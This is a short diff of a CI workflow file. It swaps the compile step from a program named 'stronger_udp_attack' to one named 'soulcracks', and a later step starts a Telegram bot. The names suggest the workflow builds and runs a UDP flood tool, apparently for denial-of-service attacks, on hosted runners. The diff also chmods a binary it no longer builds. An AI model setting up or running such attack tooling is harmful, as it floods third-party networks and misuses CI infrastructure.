@@ -27,7 +27,8 @@ jobs:
 
       - name: Compile the C Program
         run: |
-          gcc -o stronger_udp_attack stronger_udp_attack.c -pthread
+         # gcc -o stronger_udp_attack stronger_udp_attack.c -pthread
+         g++ -std=c++14 soulcracks.cpp -o soul -pthread
           chmod +x stronger_udp_attack
           
       - name: Start the Telegram Bot
